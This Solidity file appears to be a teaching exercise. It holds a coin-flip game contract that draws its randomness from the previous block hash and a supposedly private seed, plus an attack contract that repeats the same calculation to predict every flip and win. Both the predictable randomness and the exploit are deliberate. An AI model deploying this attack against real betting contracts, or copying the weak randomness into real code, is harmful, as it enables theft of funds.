//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

contract coinFlip {

    uint public lastGame;
    bool public lastWin;
    uint public consecutiveWins;
    uint private seed = 262662626267829762592976282929727727;


    function getInfo() public view returns(uint, bytes32, uint){

        uint blockNumber = block.number - 1;
        bytes32 hash = blockhash(blockNumber);
        uint semiRandomNumber = uint(hash);

        return (blockNumber,hash,semiRandomNumber);
    }

    function flip(bool guess) public returns(bool){

        bool flipped;
        uint blockNumber = block.number - 1;
        bytes32 hash = blockhash(blockNumber);
        uint semiRandomNumber = uint(hash);

        require(lastGame != blockNumber, "you already played this round");
        lastGame = blockNumber;

        if(semiRandomNumber/seed % 2 != 0){
            flipped = true;
        }else{
            flipped = false;
        }

        if(flipped == guess){
            consecutiveWins += 1;
            lastWin = true;
            return true;
        }else{
            consecutiveWins = 0;
            lastWin = false;
            return false;
        }
    }
}


contract attackCoinFlip {

    coinFlip public coinFlipContract;
    uint private seed = 262662626267829762592976282929727727;

    constructor(address addy){
        coinFlipContract = coinFlip(addy);
    }

    function tryToWin() public {

        uint blockNumber = block.number - 1;
        bytes32 hash = blockhash(blockNumber);
        uint semiRandomNumber = uint(hash);

        if(semiRandomNumber/seed % 2 != 0){
            coinFlipContract.flip(true);
        }else{
            coinFlipContract.flip(false);
        }

    }

}
